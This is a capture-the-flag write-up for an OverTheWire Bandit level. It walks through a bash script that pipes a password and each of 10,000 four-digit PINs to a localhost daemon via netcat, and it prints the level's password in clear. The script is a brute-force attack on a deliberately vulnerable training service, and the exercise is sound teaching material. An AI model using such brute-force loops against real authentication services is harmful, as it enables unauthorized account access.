A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

- For this level, we need to create a `bash script` that brute forces `10000` combinations to get the password for the next level. We already learned from the previous levels that when talking to a specific port, we need to use `netcat`. Thus, using this can be a the base of our script 

```python
echo $B24_PASS | nc localhost 30002
```

- However, there is a slight problem here. Since we are trying ten thousand combinations, the server might overload. So, we need to create a timeout. Let's try testing the response of the `nc` command

```python
bandit24@bandit:~$ echo "test" | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
```

- Another problem showed. Apparently, we need to close this so that we can try another combination. So, we need to make this into consideration to our final code

```python
#!/bin/bash

B24_PASS="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

for i in {0000..9999}; do
        response=$(timeout 0.2s bash -c "echo '$B24_PASS $i' | nc localhost 30002")

        echo -e "Trying $B24_PASS $i:\nResponse:$response"
        if ! echo "$response" | grep -q "Wrong!"; then
                echo "The correct PIN is $i"
                echo "Response: $response"
                break
        fi
done
```

- The script above loops through all the combinations concatenated by the previous level's password. It was also in the response of the server that we need to separate the previous password and the PIN code with a `space`. It is also worth noting that I used timeout to 0.2 seconds to speed up things since I don't think the server can handle doing this concurrently. The program will only stop when it can't find the `"Wrong!"` keyword from the response
